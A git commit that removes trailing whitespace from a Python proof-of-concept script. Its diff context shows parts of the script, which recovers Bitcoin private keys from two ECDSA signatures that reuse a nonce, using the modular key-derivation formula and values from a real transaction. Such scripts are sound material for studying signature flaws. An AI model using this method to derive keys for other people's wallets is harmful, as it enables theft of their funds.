40478444f04fc7120d0f6d369d2401d3ea585a2a
Darío Clavijo <daedalus2027@gmail.com>
2017-10-28 02:49:58 -0300

    Trailing spaces removed

--- ProofOfConcept.py
+++ ProofOfConcept.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #
 # Proof of concept of bitcoin private key recovery using weak ECDSA signatures
-# 
+#
 # Based on http://www.nilsschneider.net/2013/01/28/recovering-bitcoin-private-keys.html
 # Regarding Bitcoin Tx https://blockchain.info/tx/9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1.
 # As it's said in the previous article you need to poke around into the OP_CHECKSIG function in order to get z1 and z2,
@@ -21,7 +21,7 @@ p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 #r  = 0xd47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
 #s1 = 0x44e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e
 #s2 = 0x9a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab
-z1 = 0xc0e2d0a89a348de88fda08211c70d1d7e52ccef2eb9459911bf977d587784c6e 
+z1 = 0xc0e2d0a89a348de88fda08211c70d1d7e52ccef2eb9459911bf977d587784c6e
 z2 = 0x17b0f41c8c337ac1e18c98759e83a8cccbc368dd9d89e5f03cb633c265fd0ddc
 
 # r1 and s1 are contained in this ECDSA signature encoded in DER (openssl default).
@@ -80,7 +80,7 @@ def base58_check_encode(s, version=0):
     vs = chr(version) + s
     check = dhash(vs)[:4]
     return base58_encode_padded(vs + check)
-	
+
 def get_der_field(i,binary):
         if (ord(binary[i]) == 02):
                 length = binary[i+1]
@@ -117,7 +117,7 @@ def show_params(params):
 			print "%s: %s" % (param,params[param])
 
 # This is the same as (a/b mod p) but avoiding floating numbers since we are dealing with prime numbers and modulus
-# and beacuse this the python built in division isn't suitable for our needs, 
+# and beacuse this the python built in division isn't suitable for our needs,
 # it returns floating point numbers rounded and we don't want them.
 def inverse_mult(a,b,p):
 	y =  (a * pow(b,p-2,p))  #(pow(a, b) modulo p) where p should be a prime number
@@ -125,14 +125,14 @@ def inverse_mult(a,b,p):
 
 # Here is the wrock!
 def derivate_privkey(p,r,s1,s2,z1,z2):
-	
+
 	privkeys = []
-	
+
 	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1-s2)),p) % int(p)))
 	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1+s2)),p) % int(p)))
 	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1-s2)),p) % int(p)))
 	privkeys.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1+s2)),p) % int(p)))
-	
+
 	privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(s1-s2)),p) % int(p)))
         privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(s1+s2)),p) % int(p)))
         privkeys.append((inverse_mult(((z1*s2) + (z2*s1)),(r*(-s1-s2)),p) % int(p)))
@@ -141,28 +141,28 @@ def derivate_privkey(p,r,s1,s2,z1,z2):
 	return privkeys
 
 def process_signatures(params):
-	
+
 	p = params['p']
 	sig1 = params['sig1']
 	sig2 = params['sig2']
 	z1 = params['z1']
 	z2 = params['z2']
-	
+
 	tmp_r1,tmp_s1 = der_decode(sig1) # Here we extract r and s from the signature encoded in DER.
 	tmp_r2,tmp_s2 = der_decode(sig2) # Idem.
 
 	if (tmp_r1 == tmp_r2): # If r1 and r2 are equal the two signatures are weak and we can recover the private key.
 
  		if (tmp_s1 != tmp_s2): # This: (s1-s2)>0 should be complied in order be able to compute the private key.
-		
+
 			# the key of ECDSA are the integer numbers thats why we convert hexa from to them.
 			r1 = int(tmp_r1.encode('hex'),16)
 			r2 = int(tmp_r2.encode('hex'),16)
 			s1 = int(tmp_s1.encode('hex'),16)
 			s2 = int(tmp_s2.encode('hex'),16)
-	
+
 			privkey = derivate_privkey(p,r1,s1,s2,z1,z2)
-			return privkey		
+			return privkey
 
 		else:
 			raise Exception("Privkey not computable: s1 and s2 are equal.")
@@ -172,7 +172,7 @@ def process_signatures(params):
 def main():
 	show_params(params)
 	privkey = process_signatures(params)
-	if len(privkey)>0:		
+	if len(privkey)>0:
 		show_results(privkey)
 
 if __name__ == "__main__":
